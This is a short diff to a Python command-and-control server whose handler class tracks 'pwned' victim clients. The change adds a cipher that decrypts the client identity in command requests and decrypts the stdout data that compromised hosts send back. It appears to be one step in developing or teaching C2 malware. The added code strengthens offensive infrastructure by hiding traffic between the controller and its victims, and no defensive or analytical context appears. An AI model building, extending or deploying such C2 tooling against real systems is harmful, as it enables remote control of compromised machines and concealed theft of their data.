@@ -67,7 +67,13 @@ class C2Handler(BaseHTTPRequestHandler):
         global activeSession, clientAccount, clientHostname, pwnedId, pwnedDict, cwd
         
         if self.path.startswith(CMD_REQUEST):
+            # Split out the Client from http GET Request
             client = self.path.split(CMD_REQUEST)[1]
+
+            # Decrypt the client data
+            client = cipher.decrypt(client.encode()).decode()
+
+            # get the client IP from the client_address built-in property
             clientIp = self.client_address[0]
 
             # Split out the client Account Name
@@ -178,6 +184,9 @@ class C2Handler(BaseHTTPRequestHandler):
 
         # HTML/URL decode the Clients data(stdout) and translate "+" to a Space
         clientData = unquote_plus(clientData)
+
+        # Encode the client data because Decryption requires it, then Decrypt, then Decode
+        clientData = cipher.decrypt(clientData.encode()).decode()
 
         # Return Processed clientData
         return clientData
